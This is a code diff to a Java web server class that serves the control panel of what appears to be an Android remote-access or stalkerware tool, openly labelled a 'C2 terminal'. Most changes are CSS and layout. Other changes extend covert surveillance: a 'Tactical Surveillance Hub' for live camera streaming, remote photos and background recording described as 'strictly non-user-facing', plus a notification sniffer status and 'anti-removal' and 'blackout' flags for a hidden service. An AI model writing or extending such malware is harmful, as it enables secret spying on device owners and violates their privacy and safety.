@@ -189,22 +189,27 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  border-radius: 12px;" +
             "  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);" +
             "  backdrop-filter: blur(5px);" +
+            "  outline: none;" +
+            "  -webkit-tap-highlight-color: transparent;" +
             "}" +
-            ".nav a:hover {" +
-            "  background: rgba(0, 242, 255, 0.15);" +
-            "  border-color: var(--neon-cyan);" +
-            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);" +
-            "  transform: translateY(-5px);" +
-            "  color: #fff;" +
+            "@media (hover: hover) {" +
+            "  .nav a:hover {" +
+            "    background: rgba(0, 242, 255, 0.15);" +
+            "    border-color: var(--neon-cyan);" +
+            "    box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);" +
+            "    transform: translateY(-5px);" +
+            "    color: #fff;" +
+            "  }" +
             "}" +
             ".nav a.active {" +
-            "  background: #00b4cc;" + // Sharper, slightly deeper Cyan to make white text pop
+            "  background: #00b4cc;" +
             "  border-color: var(--neon-cyan);" +
             "  box-shadow: 0 0 25px rgba(0, 242, 255, 0.5);" +
             "  color: #fff;" +
             "  text-shadow: none;" +
             "  font-weight: 900;" +
             "}" +
+            ".btn-engaged-yellow { background: var(--neon-yellow) !important; color: #000 !important; border-color: var(--neon-yellow) !important; box-shadow: 0 0 20px var(--neon-yellow) !important; }" +
             ".card {" +
             "  background: var(--bg-card);" +
             "  border: 1px solid rgba(255, 255, 255, 0.05);" +
@@ -219,6 +224,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  border: 1px solid var(--neon-cyan) !important;" +
             "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2) !important;" +
             "  background: rgba(0, 242, 255, 0.02) !important;" +
+            "}" +
+            "  .card-node .icon {" +
+            "    font-size: 2.5rem;" +
+            "    margin-bottom: 15px;" +
+            "    transition: all 0.3s;" +
+            "  }" +
             "}" +
             ".card-node {" +
             "  padding: 30px 20px;" +
@@ -235,23 +246,20 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  position: relative;" +
             "  overflow: hidden;" +
             "}" +
-            ".card-node:hover {" +
-            "  transform: translateY(-10px) scale(1.02);" +
-            "  background: rgba(255,255,255,0.03);" +
-            "  box-shadow: 0 15px 30px rgba(0,0,0,0.5);" +
-            "}" +
-            ".card-node .icon {" +
-            "  font-size: 2.5rem;" +
-            "  margin-bottom: 15px;" +
-            "  transition: all 0.3s;" +
-            "}" +
-            ".card-node:hover .icon {" +
-            "  transform: scale(1.2);" +
+            "@media (hover: hover) {" +
+            "  .card-node:hover {" +
+            "    transform: translateY(-10px) scale(1.02);" +
+            "    background: rgba(255,255,255,0.03);" +
+            "    box-shadow: 0 15px 30px rgba(0,0,0,0.5);" +
+            "  }" +
+            "  .card-node:hover .icon {" +
+            "    transform: scale(1.2);" +
+            "  }" +
             "}" +
             "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; color: var(--neon-cyan); }" +
             "button, .btn {" +
             "  display: inline-block;" +
-            "  background: rgba(255, 255, 255, 0.02);" +
+            "  background: transparent !important;" +
             "  border: 1px solid currentColor;" +
             "  color: var(--neon-green);" +
             "  padding: 12px 28px;" +
@@ -260,14 +268,27 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  text-decoration: none;" +
             "  border-radius: 12px;" +
             "  font-weight: bold;" +
-            "  transition: all 0.3s;" +
             "  cursor: pointer;" +
             "  width: fit-content;" +
             "  min-width: 160px;" +
+            "  outline: none !important;" +
+            "  user-select: none;" +
+            "  box-shadow: none !important;" +
+            "  -webkit-tap-highlight-color: transparent;" +
             "}" +
-            "button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; box-shadow: 0 0 20px currentColor; transform: translateY(-2px); color: inherit; }" +
-            ".btn-engaged-yellow { background: rgba(255, 255, 0, 0.1) !important; color: var(--neon-yellow) !important; border-color: var(--neon-yellow) !important; }" +
-            ".btn-engaged-yellow:hover { box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
+            ".btn-active-yellow { background: #ffff00 !important; color: #000 !important; border-color: #ffff00 !important; box-shadow: none !important; }" +
+            "@media (hover: hover) {" +
+            "  button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; transform: translateY(-2px); }" +
+            "}" +
+            "button:focus, .btn:focus, button:active, .btn:active, button:focus-visible, .btn:focus-visible {" +
+            "  outline: none !important;" +
+            "  box-shadow: none !important;" +
+            "  background: transparent !important;" +
+            "  -webkit-tap-highlight-color: transparent !important;" +
+            "}" +
+            "button.btn-active-yellow:focus, .btn-active-yellow:focus {" +
+            "  background-color: #ffff00 !important;" +
+            "}" +
             ".info-item { background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
             ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
             ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
@@ -277,8 +298,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; margin: 0 5px; }" +
             ".breadcrumb span { color: #888; }" +
             ".file-list { list-style: none; }" +
+            "  .file-item:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); border-color: rgba(0, 242, 255, 0.3); }" +
+            "}" +
             ".file-item { display: flex; align-items: center; padding: 15px; border: 1px solid rgba(255,255,255,0.05); background: rgba(0,0,0,0.2); border-radius: 12px; margin-bottom: 10px; transition: all 0.3s; }" +
-            ".file-item:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); border-color: rgba(0, 242, 255, 0.3); }" +
             ".file-icon { font-size: 1.5rem; margin-right: 20px; width: 40px; text-align: center; }" +
             ".file-info { flex-grow: 1; }" +
             ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
@@ -316,7 +338,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .flex-header { flex-direction: column !important; align-items: flex-start !important; gap: 10px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
             "  .watermark { opacity: 1.0 !important; height: 63px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
-            "  .intel-status { font-size: 0.55rem !important; white-space: nowrap !important; }" +
+            "  .intel-status { font-size: 0.65rem !important; white-space: nowrap !important; line-height: 1.2; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
             "  h2 { font-size: 0.95rem !important; flex-wrap: nowrap !important; gap: 8px !important; display: flex !important; align-items: center !important; white-space: nowrap !important; }" +
@@ -343,11 +365,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".call-missed { color: var(--danger); text-shadow: 0 0 5px rgba(255, 49, 49, 0.4); }" +
             ".pagination { display: flex; justify-content: center; align-items: center; margin-top: 40px; gap: 8px; }" +
             ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 12px; font-size: 0.8rem; transition: all 0.3s; }" +
-            ".pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
-            ".contact-avatar { width: 35px; height: 35px; background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; font-size: 0.8rem; }" +
-            ".back-btn-container { margin-bottom: 25px; }" +
+            "  .pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
+            "}" +
+            "@media (hover: hover) {" +
+            "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 15px var(--neon-cyan); }" +
+            "}" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
-            ".btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 15px var(--neon-cyan); }" +
             ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; }" +
             "</style>" +
             "</head>" +
@@ -359,7 +382,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
-            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.3.2</div>" +
+            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.3.5</div>" +
             "  </div>" +
             "  <div class=\"nav\">" +
             "    <a href=\"/\">Terminal</a>" +
@@ -475,7 +498,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<style>" +
             "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "body { background: #050505; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
-            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); }" +
+            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
+            "h1 { font-size: 1.8rem; }" +
+            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 1.3rem; } p { font-size: 0.8rem; } }" +
             "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
             "</style></head><body>" +
             "<div class=\"logout-card\">" +
@@ -680,7 +705,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/ghost/status")) {
                         boolean active = GhostService.getInstance() != null;
                         boolean antiRemoval = GhostService.isAntiRemovalEnabled();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + "}");
+                        boolean blackout = GhostService.isBlackoutActive();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + "}");
                     } else if (uri.equals("/ghost/interact")) {
                         response = performInteraction(params);
                     } else {
@@ -749,12 +775,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         // Status Monitor Card
         html.append("<div class=\"card\">");
-        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;\">");
-        html.append("<h2 style=\"margin-bottom:0;\">SYSTEM_MONITOR [").append(sessionId).append("]</h2>");
+        html.append("<div style=\"margin-bottom: 25px;\">");
         String snifferStatus = NotificationSniffer.isServiceRunning() ? 
-            "<span class=\"intel-status\" style=\"color:var(--neon-green); font-size:0.7rem; font-family:monospace;\">&#9679; INTEL_ACTIVE</span>" : 
-            "<span class=\"intel-status\" style=\"color:var(--danger); font-size:0.7rem; font-family:monospace;\">&#9675; INTEL_DISCONNECTED</span>";
-        html.append(snifferStatus).append("</div>");
+            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
+            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
+        html.append("<h2 style=\"margin:0; font-size:1.1rem; letter-spacing:1px; line-height:1.2;\">SYSTEM_MONITOR [").append(snifferStatus).append("]</h2>");
+        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-top:8px;\">SESSION_ID: ").append(sessionId).append("</div>");
+        html.append("</div>");
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
         
         // Server Status
@@ -831,9 +858,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
 
         // Logout Section
-        html.append("<div style=\"text-align: center; margin-top: 40px; margin-bottom: 40px;\">");
+        html.append("<div style=\"text-align: center; margin-top: 40px; margin-bottom: 40px; max-width: 450px; margin-left: auto; margin-right: auto;\">");
         html.append("<form action=\"/logout\" method=\"POST\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"padding: 15px 40px; font-size: 1rem; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">TERMINATE_SESSION (LOGOUT)</button>");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 100%; padding: 15px 40px; font-size: 1rem; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">TERMINATE_SESSION (LOGOUT)</button>");
         html.append("</form>");
         html.append("</div>");
 
@@ -1645,32 +1672,32 @@ public class LabRatsHttpServer extends NanoHTTPD {
     // ============ Camera Methods ============
 
     private Response serveCameraPage() {
+        boolean nightMode = CameraService.isNightModeEnabled(context);
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
-            .append("<span style=\"color:var(--neon-cyan);\">&#128247;</span> OPTICS_TERMINAL")
-            .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled(context) ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled(context) ? "ACTIVE" : "OFF").append("</span>")
-            .append("</h2>");
+        html.append("<div style=\"display:flex; justify-content:space-between; align-items:flex-start; gap:10px; margin-bottom:20px;\">")
+            .append("<h2 style=\"margin:0; font-size:1.2rem; flex-shrink:0;\">&#128247; OPTICS</h2>")
+            .append("<span id=\"night-mode-status\" style=\"font-size:0.65rem; color:var(--neon-cyan); font-family:monospace; text-align:right; line-height:1.2;\">NIGHT_MODE:<br><span id=\"night-status-val\" style=\"color:").append(nightMode ? "var(--neon-green)" : "var(--neon-red)").append(";\">").append(nightMode ? "ACTIVE" : "OFF").append("</span></span>")
+            .append("</div>");
 
-        boolean nightMode = CameraService.isNightModeEnabled(context);
-        html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; flex-wrap:wrap; justify-content:center; align-items:center; gap:10px; border:1px solid rgba(255,255,0,0.1); border-radius:12px; background:rgba(255,255,0,0.02);\">")
-            .append("<button onclick=\"toggleNightMode()\" id=\"night-btn\" class=\"btn ").append(nightMode ? "btn-engaged-yellow" : "").append("\" style=\"padding:10px 20px; border-color:var(--neon-yellow); color:var(--neon-yellow); background:rgba(255,255,0,0.05); font-size:0.8rem;\">")
+        html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; justify-content:center;\">")
+            .append("<button onclick=\"toggleNightMode()\" ontouchend=\"this.blur()\" id=\"night-btn\" class=\"btn ").append(nightMode ? "btn-active-yellow" : "").append("\" style=\"padding:12px 24px; font-size:0.85rem; width:auto; min-width:200px;\">")
             .append("&#127769; TOGGLE NIGHT VISION")
             .append("</button>")
             .append("<script>")
             .append("function toggleNightMode() {")
             .append("  const btn = document.getElementById('night-btn');")
+            .append("  const val = document.getElementById('night-status-val');")
             .append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {")
-            .append("    const status = document.getElementById('night-mode-status');")
             .append("    if(data.nightMode) {")
-            .append("      status.innerText = 'NIGHT_MODE: ACTIVE'; status.style.color = 'var(--neon-green)';")
-            .append("      btn.classList.add('btn-engaged-yellow');")
+            .append("      val.innerText = 'ACTIVE'; val.style.color = 'var(--neon-green)';")
+            .append("      btn.classList.add('btn-active-yellow');")
             .append("    } else {")
-            .append("      status.innerText = 'NIGHT_MODE: OFF'; status.style.color = 'var(--neon-red)';")
-            .append("      btn.classList.remove('btn-engaged-yellow');")
+            .append("      val.innerText = 'OFF'; val.style.color = 'var(--neon-red)';")
+            .append("      btn.classList.remove('btn-active-yellow');")
             .append("    }")
             .append("  });")
             .append("}")
@@ -1700,78 +1727,33 @@ public class LabRatsHttpServer extends NanoHTTPD {
             html.append("<p>No cameras available</p>");
             html.append("</div>");
         } else {
-            // Photo Capture Section
-            html.append("<div class=\"info-section\">");
-            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
+            // Tactical Surveillance Hub (Merged Section)
+            html.append("<div class=\"info-section\" style=\"margin-top: 5px;\">");
+            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px; line-height: 1.3;\">&#128249; Tactical Surveillance<br>Hub</h3>");
             html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
+                    "<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 15px;\">Unified control center for live streaming, remote snapshots, and covert background recording. All operations are strictly non-user-facing.</p>");
             html.append(
-                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px;\">");
+                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; font-size: 0.7rem; color: #888; font-family: monospace;\">UPLINK_STANDBY</div>");
+            html.append(
+                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 25px;\">");
 
             for (CameraHelper.CameraInfo cam : cameras) {
-                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
-                String bgColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.1)" : "rgba(52, 152, 219, 0.2)";
-                String borderColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.3)" : "rgba(52, 152, 219, 0.3)";
-                String textColor = cam.facing.equals("Front") ? "#00f2ff" : "#3498db";
+                boolean isBack = cam.facing.equalsIgnoreCase("Back");
+                // Front = Ninja | Back = Spy/Detective (Distinct identities)
+                String icon = isBack ? "&#128373;" : "&#129399;";
 
-                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
-                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
-                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
-                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
-                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
-                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
-                        .append(cam.facing).append(" Camera</div>");
-                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
-                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
+                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" class=\"card-node\" style=\"padding:25px 15px; background:rgba(231, 76, 60, 0.15); border:1px solid rgba(231, 76, 60, 0.3); border-radius:12px; text-align:center; text-decoration:none; display:block; transition:all 0.3s;\">");
+                html.append("<div style=\"font-size: 2.2rem; margin-bottom: 10px;\">").append(icon).append("</div>");
+                html.append("<div style=\"color: #e74c3c; font-weight: 900; font-size: 0.85rem; letter-spacing: 1px;\">LIVE_").append(cam.facing.toUpperCase()).append("</div>");
+                html.append("<div style=\"color: #888; font-size: 0.65rem; margin-top: 8px; font-family: monospace;\">UPLINK_READY</div>");
                 html.append("</a>");
             }
             html.append("</div>");
-            html.append("</div>");
 
-            // Live Streaming Section
-            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
-            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
-            html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
-            html.append(
-                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px;\">");
-
-            for (CameraHelper.CameraInfo cam : cameras) {
-                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
-                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
-                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
-                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
-                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
-                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
-                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
-                        .append("</div>");
-                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
-                html.append("</a>");
-            }
-            html.append("</div>");
-            html.append("</div>");
-
-            // Video Recording Section
-            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
-            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
-            html.append(
-                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
-            html.append(
-                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
-            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
-
-            for (CameraHelper.CameraInfo cam : cameras) {
-                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
-                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
-                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
-                html.append("&#127909; Record ").append(cam.facing);
-                html.append("</button>");
-            }
-
-            html.append("<button onclick=\"stopRecording()\" ");
-            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
-            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
-            html.append("&#9632; Stop Recording");
+            html.append("<div style=\"display: flex; justify-content: center; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
+            html.append("<button onclick=\"stopRecording()\" id=\"stop-rec-btn\" class=\"btn\" ");
+            html.append("style=\"width: 100%; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); font-size: 0.8rem;\">");
+            html.append("&#9632; TERMINATE ALL ACTIVE CAPTURE");
             html.append("</button>");
             html.append("</div>");
 
@@ -1780,32 +1762,29 @@ public class LabRatsHttpServer extends NanoHTTPD {
             html.append("function startRecording(camId) {");
             html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
             html.append(
-                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
+                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Background Capture Active (' + camId + ')</span>';");
             html.append("  });");
             html.append("}");
             html.append("function stopRecording() {");
             html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
             html.append(
-                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
+                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">All capture terminated. ' + (d.path || '') + '</span>';");
             html.append("  });");
             html.append("}");
             html.append("function checkRecStatus() {");
             html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
             html.append("    if (d.recording) {");
             html.append(
-                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
+                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Background Capture Active (' + d.duration + 's)</span>';");
             html.append("    } else {");
             html.append(
-                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
+                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">HUB_STANDBY</span>';");
             html.append("    }");
             html.append("  });");
             html.append("}");
             html.append("checkRecStatus();");
             html.append("setInterval(checkRecStatus, 2000);");
             html.append("</script>");
-
-            html.append("</div>");
-
         }
 
         html.append("</div>");
@@ -2018,13 +1997,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 fps = 12;
                 resLabel = "Very High (800x600)";
                 break;
-            case "hd":
-                width = 1280;
-                height = 720;
-                quality = 70;
-                fps = 15;
-                resLabel = "HD (1280x720)";
-                break;
         }
 
         int refreshRate = 1000 / fps; // Convert FPS to milliseconds
@@ -2082,8 +2054,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 "<h4 style=\"color: #888; margin-bottom: 10px; font-size: 0.9rem;\">&#128246; Resolution (for slow internet, choose lower)</h4>");
         html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");
 
-        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
-        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
+        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high" };
+        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High" };
         for (int i = 0; i < resOptions.length; i++) {
             String selected = resOptions[i].equals(res) ? "background: #00f2ff; color: #050505;"
                     : "background: rgba(255,255,255,0.1);";
@@ -2114,15 +2086,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
 
         // Action buttons
-        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
-        html.append(
-                "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
-        html.append(
-                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
-        html.append(
-                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
-        html.append(
-                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
+        html.append("<div style=\"display: flex; gap: 15px; justify-content: center; flex-direction: column; align-items: center; margin-top: 20px; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
+        
+        html.append("<button onclick=\"rotateStream()\" class=\"btn\" style=\"width: 100%; border-color: #f39c12; color: #f39c12; background: rgba(243, 156, 18, 0.05); padding: 15px;\">&#8635; ROTATE_VIEW_90&deg;</button>");
+        
+        html.append("<button onclick=\"capturePhoto()\" class=\"btn\" style=\"width: 100%; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 15px;\">&#128247; CAPTURE_REMOTE_PHOTO</button>");
+        
+        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn\" style=\"width: 100%; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 15px;\">&#9679; START_COVERT_RECORDING</button>");
+        
+        html.append("<a href=\"/camera\" class=\"btn\" style=\"width: 100%; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 15px; text-decoration: none; text-align: center;\">&#8592; BACK</a>");
+
         html.append("</div>");
 
         // Status
@@ -2203,16 +2176,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  if (isRecording) {");
         html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
         html.append("      document.getElementById('status').innerHTML = d.message;");
-        html.append("      btn.innerHTML = '&#9679; Start Recording';");
-        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
+        html.append("      btn.innerHTML = '&#9679; START_COVERT_RECORDING';");
+        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.05)';");
         html.append("      indicator.style.display = 'none';");
         html.append("      isRecording = false;");
         html.append("    });");
         html.append("  } else {");
         html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
         html.append("      document.getElementById('status').innerHTML = d.message;");
-        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
-        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
+        html.append("      btn.innerHTML = '&#9632; STOP_COVERT_RECORDING';");
+        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.2)';");
         html.append("      indicator.style.display = 'block';");
         html.append("      isRecording = true;");
         html.append("    });");
@@ -2224,7 +2197,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
         html.append("    if (d.recording) {");
         html.append("      document.getElementById('rec-indicator').style.display = 'block';");
-        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
